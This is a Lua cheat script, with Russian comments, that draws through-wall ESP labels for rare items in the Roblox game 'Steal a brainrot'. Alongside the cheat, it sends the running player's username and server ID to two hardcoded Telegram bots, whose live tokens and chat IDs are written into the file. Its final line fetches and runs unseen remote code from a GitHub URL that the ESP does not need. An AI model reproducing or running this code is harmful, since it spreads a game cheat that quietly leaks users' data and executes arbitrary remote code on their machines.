local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local request = syn and syn.request or http and http.request or fluxus and fluxus.request or http_request or request

-- Конфигурация ESP
local ESP_SETTINGS = {
    UpdateInterval = 0.5,
    MaxDistance = 500,
    TextSize = 18,
    Font = Enum.Font.GothamBold,
    PartColors = {
        Color3.new(1, 1, 1),    -- Белый
        Color3.new(0.2, 0.6, 1),-- Синий
        Color3.new(1, 0.2, 0.2) -- Красный
    },
    SoundId = "rbxassetid://130785805",
    SoundVolume = 1.5,
    PlaySoundOnce = false
}

-- Настройки сканера
local SCANNER_SETTINGS = {
    ScanKey = Enum.KeyCode.F,
    DebounceTime = 3,
    IgnoreClasses = {"SurfaceAppearance", "Part"}
}

-- Настройки Telegram ботов
local TG_MAIN = {
    Token = "7624455250:AAHXqHESVLzkJi7w9Q5YXyGf394dIfrXy1M",
    ChatId = "1072158346",
    Enabled = true,
    ImportantObjects = {
        ["Secret Lucky Block"] = true,
        ["Pot Hotspot"] = true,
        ["La Grande Combinasion"] = true,
        ["Garama and Madundung"] = true,
        ["Nuclearo Dinossauro"] = true,
        ["Chicleteira Bicicleteira"] = true,
        ["Dragon Cannelloni"] = true,
        ["Los Combinasionas"] = true 
    }
}

local TG_SPECIAL = {
    Token = "8403219194:AAHXD_oxTlI2YHWKFz6SKvspfo7hJY32Tsk",
    ChatId = "-1002767532824",
    Enabled = true,
    SpecialObjects = {
        ["La Vacca Saturno Saturnita"] = true,
        ["Chimpanzini Spiderini"] = true
    },
    GroupSettings = {
        PinMessages = true,
        DisableNotifications = false
    }
}

-- Список объектов с эмодзи
local OBJECT_EMOJIS = {
    ["La Vacca Saturno Saturnita"] = "🐮",
    ["Chimpanzini Spiderini"] = "🕷",
    ["Los Tralaleritos"] = "🐟",
    ["Las Tralaleritas"] = "🌸",
    ["Graipuss Medussi"] = "🦑",
    ["Torrtuginni Dragonfrutini"] = "🐉",
    ["Pot Hotspot"] = "📱",
    ["La Grande Combinasion"] = "❗️",
    ["Garama and Madundung"] = "🥫",
    ["Secret Lucky Block"] = "⬛️",
    ["Dragon Cannelloni"] = "🐲",
    ["Nuclearo Dinossauro"] = "🦕",
    ["Las Vaquitas Saturnitas"] = "👦",
    ["Chicleteira Bicicleteira"] = "🚲",
    ["Los Combinasionas"] = "⚒️",
    ["Agarrini la Palini"] = "🥄"
}

-- Эмодзи для мутаций
local MUTATION_EMOJIS = {
    ["Gold"] = "🟨",
    ["Lava"] = "🟧",
    ["Rainbow"] = "🌈",
    ["Diamond"] = "💎",
    ["Candy"] = "🍬",
    ["Bloodrot"] = "🟥"
}

local OBJECT_NAMES = {
    "La Vacca Saturno Saturnita",
    "Chimpanzini Spiderini",
    "Los Tralaleritos",
    "Las Tralaleritas",
    "Graipuss Medussi",
    "Torrtuginni Dragonfrutini",
    "Pot Hotspot",
    "La Grande Combinasion",
    "Garama and Madundung",
    "Secret Lucky Block",
    "Dragon Cannelloni",
    "Nuclearo Dinossauro",
    "Las Vaquitas Saturnitas",
    "Chicleteira Bicicleteira",
    "Los Combinasionas",
    "Agarrini la Palini"
}

-- Системные переменные
local camera = workspace.CurrentCamera
local espCache = {}
local lastUpdate = 0
local foundObjects = {}
local objectsToNotify = {}
local lastScanTime = 0

-- Создаем интерфейс
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RussianESP"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false

-- Функции утилиты
local function getAccountInfo()
    local player = Players.LocalPlayer
    return player and player.Name or "Неизвестный аккаунт"
end

local function getServerId()
    local jobId = game.JobId
    return jobId ~= "" and jobId or "Одиночная игра"
end

local function getMutationEmoji(mutation)
    return MUTATION_EMOJIS[mutation] or "⬜️"
end

-- Функция проверки прозрачности частей Cube.
local function checkCubeTransparency(obj)
    if not obj:IsA("Model") then return true end
    
    for _, part in ipairs(obj:GetDescendants()) do
        if part:IsA("BasePart") and part.Name:match("^Cube%.") then
            print("Проверка: " .. part.Name .. " - прозрачность " .. part.Transparency)
            if part.Transparency > 0.40 then
                return false
            end
        end
    end
    return true
end

-- Функции для сбора информации об объектах
local function findMutation(obj)
    local mutation = obj:GetAttribute("Mutation")
    if mutation then return tostring(mutation) end
    
    for _, child in ipairs(obj:GetDescendants()) do
        if child:IsA("StringValue") and child.Name == "Mutation" then
            return child.Value
        end
        
        if child:IsA("ObjectValue") and child.Name == "Mutation" and child.Value then
            return child.Value.Name
        end
    end
    
    local nameParts = obj.Name:split(" ")
    for _, part in ipairs(nameParts) do
        if MUTATION_EMOJIS[part] then
            return part
        end
    end
    
    return nil
end

local function findTraits(obj)
    local traits = {}
    
    local traitsAttr = obj:GetAttribute("Traits")
    if traitsAttr then
        if type(traitsAttr) == "table" then
            for _, v in pairs(traitsAttr) do
                table.insert(traits, tostring(v))
            end
        else
            table.insert(traits, tostring(traitsAttr))
        end
    end
    
    for _, child in ipairs(obj:GetDescendants()) do
        if child:IsA("StringValue") and (child.Name == "Trait" or child.Name == "Traits") then
            table.insert(traits, child.Value)
        end
    end
    
    for _, child in ipairs(obj:GetDescendants()) do
        if child:IsA("ObjectValue") and (child.Name == "Trait" or child.Name == "Traits") and child.Value then
            table.insert(traits, child.Value.Name)
        end
    end
    
    return traits
end

local function scanObject(obj)
    if not obj or not obj.Parent then return nil end
    
    -- Проверка прозрачности только для частей Cube.
    if not checkCubeTransparency(obj) then
        print(obj.Name .. ": найдены части Cube. с высокой прозрачностью (>0.40), уведомление не отправляется")
        return nil
    end
    
    local mutation = findMutation(obj)
    local traits = findTraits(obj)
    
    if not mutation then
        for _, trait in ipairs(traits) do
            if MUTATION_EMOJIS[trait] then
                mutation = trait
                break
            end
        end
    end
    
    return {
        name = obj.Name,
        mutation = mutation,
        traits = traits
    }
end

local function scanAllObjects()
    local now = os.time()
    if now - lastScanTime < SCANNER_SETTINGS.DebounceTime then
        print("Подождите...")
        return
    end
    
    lastScanTime = now
    print("\n🔍 Начинаем сканирование всех объектов...")
    
    local foundCount = 0
    
    for _, obj in ipairs(workspace:GetDescendants()) do
        if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
            local details = scanObject(obj)
            if details then
                foundCount = foundCount + 1
                print("\n=== ОБЪЕКТ #"..foundCount.." ===")
                print("Имя:", details.name)
                print("Мутация:", details.mutation or "Нет")
                print("Traits ("..#details.traits.."):")
                for i, trait in ipairs(details.traits) do
                    print(i..".", trait)
                end
            end
        end
    end
    
    if foundCount == 0 then
        print("❌ Объекты не найдены")
    else
        print("\n=== РЕЗУЛЬТАТ ===")
        print("Найдено объектов:", foundCount)
    end
end

-- Отправка в ОСНОВНОГО бота
local function sendMainTelegramAlert()
    if not TG_MAIN.Enabled or not request or #objectsToNotify == 0 then return end
    
    local serverId = getServerId()
    local username = getAccountInfo()
    
    local importantObjects = {}
    local regularObjects = {}
    
    for _, objData in ipairs(objectsToNotify) do
        local objName = objData.name
        if not TG_SPECIAL.SpecialObjects[objName] then
            if TG_MAIN.ImportantObjects[objName] then
                table.insert(importantObjects, objData)
            else
                table.insert(regularObjects, objData)
            end
        end
    end
    
    if #importantObjects + #regularObjects == 0 then return end
    
    local message = string.format(
        "*🔍 Обнаружены объекты в Steal a brainrot*\n"..
        "👤 Игрок: `@%s`\n"..
        "🌐 Сервер: `%s`\n"..
        "🕘 Время: `%s`\n\n",
        username, serverId, os.date("%X")
    )
    
    if #importantObjects > 0 then
        message = message .. "*🚨 ВАЖНЫЕ ОБЪЕКТЫ:*\n"
        for _, objData in ipairs(importantObjects) do
            local emoji = OBJECT_EMOJIS[objData.name] or "⚠️"
            local mutationEmoji = getMutationEmoji(objData.mutation)
            
            message = message .. string.format("%s%s %s", emoji, mutationEmoji, objData.name)
            
            if #objData.traits > 0 then
                message = message .. " + " .. table.concat(objData.traits, " + ")
            end
            
            message = message .. "\n"
        end
        message = message .. "\n"
    end
    
    if #regularObjects > 0 then
        message = message .. "*🔹 Обычные объекты:*\n"
        for _, objData in ipairs(regularObjects) do
            local emoji = OBJECT_EMOJIS[objData.name] or "🔸"
            local mutationEmoji = getMutationEmoji(objData.mutation)
            
            message = message .. string.format("%s%s %s", emoji, mutationEmoji, objData.name)
            
            if #objData.traits > 0 then
                message = message .. " + " .. table.concat(objData.traits, " + ")
            end
            
            message = message .. "\n"
        end
    end
    
    if serverId ~= "Одиночная игра" then
        message = message .. string.format(
            "\n🚀 Телепорт:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
            serverId
        )
    end
    
    request({
        Url = "https://api.telegram.org/bot"..TG_MAIN.Token.."/sendMessage",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            chat_id = TG_MAIN.ChatId,
            text = message,
            parse_mode = "Markdown"
        })
    })
end

-- Отправка в ГРУППУ (специальные объекты)
local function sendSpecialTelegramAlert(objData)
    if not TG_SPECIAL.Enabled or not request then return end
    
    local serverId = getServerId()
    local username = getAccountInfo()
    local emoji = OBJECT_EMOJIS[objData.name] or "🔹"
    local mutationEmoji = getMutationEmoji(objData.mutation)
    
    local message = string.format(
        "*🔔 СПЕЦИАЛЬНЫЙ ОБЪЕКТ 🔔*\n"..
        "%s%s %s", emoji, mutationEmoji, objData.name)
        
    if #objData.traits > 0 then
        message = message .. " + " .. table.concat(objData.traits, " + ")
    end
    
    message = message .. string.format(
        "\n🕹 Игра: Steal a brainrot\n"..
        "👤 Игрок: `@%s`\n"..
        "🌐 Сервер: `%s`\n"..
        "🕘 Время: `%s`",
        username, serverId, os.date("%X"))
    
    if serverId ~= "Одиночная игра" then
        message = message .. string.format(
            "\n\n🚀 Телепорт:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
            serverId
        )
    end
    
    local response = request({
        Url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/sendMessage",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            chat_id = TG_SPECIAL.ChatId,
            text = message,
            parse_mode = "Markdown",
            disable_notification = TG_SPECIAL.GroupSettings.DisableNotifications
        })
    })
    
    if response.Success and TG_SPECIAL.GroupSettings.PinMessages then
        local messageId = HttpService:JSONDecode(response.Body).result.message_id
        request({
            Url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/pinChatMessage",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                chat_id = TG_SPECIAL.ChatId,
                message_id = messageId,
                disable_notification = true
            })
        })
    end
end

-- Воспроизведение звука
local function playDetectionSound()
    local sound = Instance.new("Sound")
    sound.SoundId = ESP_SETTINGS.SoundId
    sound.Volume = ESP_SETTINGS.SoundVolume
    sound.Parent = workspace
    sound:Play()
    game:GetService("Debris"):AddItem(sound, 3)
end

-- Создание текста ESP
local function createColoredText(name)
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextSize = ESP_SETTINGS.TextSize
    textLabel.Font = ESP_SETTINGS.Font
    textLabel.TextXAlignment = Enum.TextXAlignment.Center
    textLabel.TextStrokeTransparency = 0.3
    
    local emoji = OBJECT_EMOJIS[name] or "🔹"
    local parts = {}
    for part in name:gmatch("%S+") do
        table.insert(parts, part)
    end
    
    local richText = ""
    for i, part in ipairs(parts) do
        local color = ESP_SETTINGS.PartColors[math.min(i, #ESP_SETTINGS.PartColors)]
        richText = richText .. string.format(
            '<font color="rgb(%d,%d,%d)">%s</font> ',
            math.floor(color.r * 255),
            math.floor(color.g * 255),
            math.floor(color.b * 255),
            i == 1 and emoji.." "..part or part
        )
    end
    
    textLabel.Text = richText
    textLabel.RichText = true
    return textLabel
end

-- Создание ESP элемента
local function createESPElement(obj)
    local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
    if not rootPart then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Size = UDim2.new(0, 350, 0, 50)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = ESP_SETTINGS.MaxDistance
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    
    local textLabel = createColoredText(obj.Name)
    textLabel.Parent = billboard
    
    billboard.Adornee = rootPart
    billboard.Parent = screenGui
    
    return {
        labelGui = billboard,
        label = textLabel,
        rootPart = rootPart,
        object = obj
    }
end

-- Основная функция ESP
local function updateESP(deltaTime)
    lastUpdate = lastUpdate + deltaTime
    if lastUpdate < ESP_SETTINGS.UpdateInterval then return end
    lastUpdate = 0

    -- Очистка старых объектов
    for obj, data in pairs(espCache) do
        if not obj.Parent or not data.rootPart.Parent then
            data.labelGui:Destroy()
            espCache[obj] = nil
            foundObjects[obj] = nil
        end
    end

    -- Поиск новых объектов
    for _, obj in ipairs(workspace:GetDescendants()) do
        if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
            local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
            if not rootPart then continue end

            local distance = (rootPart.Position - camera.CFrame.Position).Magnitude
            if distance > ESP_SETTINGS.MaxDistance then
                if espCache[obj] then
                    espCache[obj].labelGui.Enabled = false
                end
                continue
            end

            local isNewObject = not foundObjects[obj]
            foundObjects[obj] = true

            if not espCache[obj] then
                espCache[obj] = createESPElement(obj)
                local objData = scanObject(obj)
                if objData then
                    playDetectionSound()
                    
                    if isNewObject then
                        table.insert(objectsToNotify, objData)
                        if TG_SPECIAL.SpecialObjects[obj.Name] then
                            sendSpecialTelegramAlert(objData)
                        end
                    end
                end
            end

            local data = espCache[obj]
            local _, onScreen = camera:WorldToViewportPoint(rootPart.Position)
            data.labelGui.Enabled = onScreen
        end
    end
    
    if #objectsToNotify > 0 then
        sendMainTelegramAlert()
        objectsToNotify = {}
    end
end

-- Запуск системы
RunService.Heartbeat:Connect(updateESP)

-- Обработка игроков
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        updateESP(0)
    end)
end)

-- Обработчик клавиши сканера
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == SCANNER_SETTINGS.ScanKey then
        scanAllObjects()
    end
end)

-- Первоначальное сканирование
updateESP(0)

print("Steal a brainrot ESP System активирован!")
print("Отслеживается объектов: "..#OBJECT_NAMES)
print("ID сервера:", getServerId())
print("\nНажмите F для сканирования всех объектов")
loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
